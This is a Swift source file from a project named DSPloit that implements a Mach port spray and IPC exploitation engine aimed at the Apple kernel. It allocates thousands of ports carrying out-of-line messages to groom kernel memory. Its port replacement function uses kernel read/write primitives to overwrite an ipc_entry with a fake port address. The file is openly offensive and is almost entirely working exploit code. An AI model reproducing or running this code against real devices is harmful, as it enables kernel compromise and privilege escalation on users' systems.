//
//  MachPortSpray.swift
//  DSPloit
//
//  🔥 BLEEDING EDGE: Mach Port Spray & IPC Exploitation Engine
//  Port spraying, OOL descriptor abuse, port replacement attacks
//  Created by Royan
//

import Foundation

// MARK: - Port Info

struct MachPortInfo: Identifiable {
    let id = UUID()
    let portName: mach_port_name_t
    let portAddr: UInt64 // Kernel address of ipc_port
    let type: PortType
    let rights: PortRights
    let refCount: UInt32
    let msgCount: UInt32
    let destAddr: UInt64
    let receiverPid: Int32
    
    enum PortType: String {
        case send = "Send"
        case receive = "Receive"
        case sendOnce = "Send-Once"
        case portSet = "Port Set"
        case dead = "Dead Name"
    }
    
    struct PortRights {
        let send: Bool
        let receive: Bool
        let sendOnce: Bool
    }
}

struct PortSprayConfig: Identifiable {
    let id = UUID()
    var portCount: Int = 1000
    var messageSize: Int = 256
    var oolSize: Int = 4096
    var useOOLDescriptors: Bool = true
    var targetZone: String = "ipc_ports"
    var sprayPattern: SprayPattern = .sequential
    
    enum SprayPattern: String, CaseIterable {
        case sequential = "Sequential"
        case interleaved = "Interleaved"
        case randomized = "Randomized"
        case targeted = "Targeted"
    }
}

struct PortSprayResult: Identifiable {
    let id = UUID()
    let timestamp: Date
    let portsCreated: Int
    let messagesQueued: Int
    let oolPagesAllocated: Int
    let kernelMemoryUsed: UInt64
    let success: Bool
    let ports: [mach_port_name_t]
}

struct IPCMessage: Identifiable {
    let id = UUID()
    let timestamp: Date
    let sourcePort: mach_port_name_t
    let destPort: mach_port_name_t
    let msgId: Int32
    let size: Int
    let hasOOL: Bool
    let direction: Direction
    
    enum Direction: String {
        case sent = "Sent"
        case received = "Received"
        case intercepted = "Intercepted"
    }
}

// MARK: - Mach Port Spray Engine

class MachPortSprayEngine: ObservableObject {
    @Published var ports: [MachPortInfo] = []
    @Published var sprayResults: [PortSprayResult] = []
    @Published var interceptedMessages: [IPCMessage] = []
    @Published var isSpraying: Bool = false
    @Published var sprayProgress: Double = 0.0
    @Published var config: PortSprayConfig = PortSprayConfig()
    @Published var allocatedPorts: [mach_port_name_t] = []
    
    static let shared = MachPortSprayEngine()
    private let mgr = dspmgr.shared
    
    // MARK: - Port Enumeration
    
    func enumeratePorts() {
        guard mgr.dsready else { return }
        ports.removeAll()
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            // Get port space for current task
            var names: mach_port_name_array_t?
            var namesCount: mach_msg_type_number_t = 0
            var types: mach_port_type_array_t?
            var typesCount: mach_msg_type_number_t = 0
            
            let kr = mach_port_names(mach_task_self_, &names, &namesCount, &types, &typesCount)
            guard kr == KERN_SUCCESS, let names, let types else { return }
            
            var discoveredPorts: [MachPortInfo] = []
            
            for i in 0..<Int(namesCount) {
                let name = names[i]
                let type = types[i]
                
                let portType: MachPortInfo.PortType
                if type & UInt32(MACH_PORT_TYPE_RECEIVE) != 0 {
                    portType = .receive
                } else if type & UInt32(MACH_PORT_TYPE_SEND) != 0 {
                    portType = .send
                } else if type & UInt32(MACH_PORT_TYPE_SEND_ONCE) != 0 {
                    portType = .sendOnce
                } else if type & UInt32(MACH_PORT_TYPE_PORT_SET) != 0 {
                    portType = .portSet
                } else if type & UInt32(MACH_PORT_TYPE_DEAD_NAME) != 0 {
                    portType = .dead
                } else {
                    portType = .dead
                }
                
                let rights = MachPortInfo.PortRights(
                    send: type & UInt32(MACH_PORT_TYPE_SEND) != 0,
                    receive: type & UInt32(MACH_PORT_TYPE_RECEIVE) != 0,
                    sendOnce: type & UInt32(MACH_PORT_TYPE_SEND_ONCE) != 0
                )
                
                let portInfo = MachPortInfo(
                    portName: name,
                    portAddr: 0, // Would need kernel read to resolve
                    type: portType,
                    rights: rights,
                    refCount: 1,
                    msgCount: 0,
                    destAddr: 0,
                    receiverPid: getpid()
                )
                discoveredPorts.append(portInfo)
            }
            
            // Deallocate
            vm_deallocate(mach_task_self_, vm_address_t(bitPattern: names), vm_size_t(namesCount) * vm_size_t(MemoryLayout<mach_port_name_t>.size))
            vm_deallocate(mach_task_self_, vm_address_t(bitPattern: types), vm_size_t(typesCount) * vm_size_t(MemoryLayout<mach_port_type_t>.size))
            
            DispatchQueue.main.async {
                self.ports = discoveredPorts
            }
        }
    }
    
    // MARK: - Port Spray
    
    func startSpray() {
        isSpraying = true
        sprayProgress = 0.0
        allocatedPorts.removeAll()
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            var createdPorts: [mach_port_name_t] = []
            let total = self.config.portCount
            
            for i in 0..<total {
                var port: mach_port_name_t = 0
                let kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
                
                if kr == KERN_SUCCESS {
                    // Insert send right
                    mach_port_insert_right(mach_task_self_, port, port, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
                    createdPorts.append(port)
                    
                    // Queue message if configured
                    if self.config.useOOLDescriptors {
                        self.queueOOLMessage(port: port, size: self.config.oolSize)
                    }
                }
                
                if i % 100 == 0 {
                    DispatchQueue.main.async {
                        self.sprayProgress = Double(i) / Double(total)
                    }
                }
            }
            
            let result = PortSprayResult(
                timestamp: Date(),
                portsCreated: createdPorts.count,
                messagesQueued: self.config.useOOLDescriptors ? createdPorts.count : 0,
                oolPagesAllocated: self.config.useOOLDescriptors ? createdPorts.count * (self.config.oolSize / 4096) : 0,
                kernelMemoryUsed: UInt64(createdPorts.count) * 168, // ipc_port size
                success: createdPorts.count > 0,
                ports: createdPorts
            )
            
            DispatchQueue.main.async {
                self.allocatedPorts = createdPorts
                self.sprayResults.insert(result, at: 0)
                self.isSpraying = false
                self.sprayProgress = 1.0
            }
        }
    }
    
    // MARK: - OOL Message Queueing
    
    private func queueOOLMessage(port: mach_port_name_t, size: Int) {
        // Allocate OOL data
        var oolData = Data(count: size)
        oolData.withUnsafeMutableBytes { buffer in
            // Fill with pattern for identification
            let pattern: UInt64 = 0x4141414142424242
            for i in stride(from: 0, to: size, by: 8) {
                buffer.storeBytes(of: pattern, toByteOffset: i, as: UInt64.self)
            }
        }
        
        // Send mach message with OOL descriptor
        // This allocates kernel memory in the target's address space
        struct OOLMsg {
            var header: mach_msg_header_t
            var body: mach_msg_body_t
            var ool: mach_msg_ool_descriptor_t
        }
        
        var msg = OOLMsg(
            header: mach_msg_header_t(),
            body: mach_msg_body_t(msgh_descriptor_count: 1),
            ool: mach_msg_ool_descriptor_t()
        )
        
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | UInt32(MACH_MSGH_BITS_COMPLEX)
        msg.header.msgh_size = mach_msg_size_t(MemoryLayout<OOLMsg>.size)
        msg.header.msgh_remote_port = port
        msg.header.msgh_local_port = MACH_PORT_NULL
        
        oolData.withUnsafeBytes { buffer in
            msg.ool.address = UnsafeMutableRawPointer(mutating: buffer.baseAddress!)
            msg.ool.size = mach_msg_size_t(size)
            msg.ool.deallocate = 0
            msg.ool.copy = UInt8(MACH_MSG_VIRTUAL_COPY)
            msg.ool.type = UInt8(MACH_MSG_OOL_DESCRIPTOR)
        }
        
        withUnsafePointer(to: &msg) { ptr in
            let _ = mach_msg(
                UnsafeMutablePointer(mutating: UnsafeRawPointer(ptr).assumingMemoryBound(to: mach_msg_header_t.self)),
                MACH_SEND_MSG | Int32(MACH_SEND_TIMEOUT),
                msg.header.msgh_size,
                0,
                MACH_PORT_NULL,
                100, // timeout ms
                MACH_PORT_NULL
            )
        }
    }
    
    // MARK: - Cleanup
    
    func destroySprayedPorts() {
        for port in allocatedPorts {
            mach_port_destroy(mach_task_self_, port)
        }
        allocatedPorts.removeAll()
    }
    
    // MARK: - Port Replacement Attack
    
    func attemptPortReplacement(targetPort: mach_port_name_t, fakePortAddr: UInt64) -> Bool {
        guard mgr.dsready else { return false }
        
        // Find the ipc_port in kernel memory
        // This requires resolving the port name to kernel address
        // via the task's ipc_space
        
        let ourTask = ds_get_our_task()
        guard ourTask != 0 else { return false }
        
        // Read ipc_space from task
        let ipcSpace = ds_kread64(ourTask + 0x330) // task->itk_space (offset varies)
        guard ipcSpace != 0 else { return false }
        
        // Read is_table from ipc_space
        let isTable = ds_kread64(ipcSpace + 0x20) // is_table offset
        guard isTable != 0 else { return false }
        
        // Calculate entry for target port
        let index = UInt64(targetPort >> 8) // MACH_PORT_INDEX
        let entryAddr = isTable + index * 24 // sizeof(ipc_entry) = 24
        
        // Read current port pointer
        let currentPortAddr = ds_kread64(entryAddr)
        
        // Replace with fake port
        ds_kwrite64(entryAddr, fakePortAddr)
        
        // Verify
        let verify = ds_kread64(entryAddr)
        
        if verify != fakePortAddr {
            // Restore original
            ds_kwrite64(entryAddr, currentPortAddr)
            return false
        }
        
        return true
    }
}
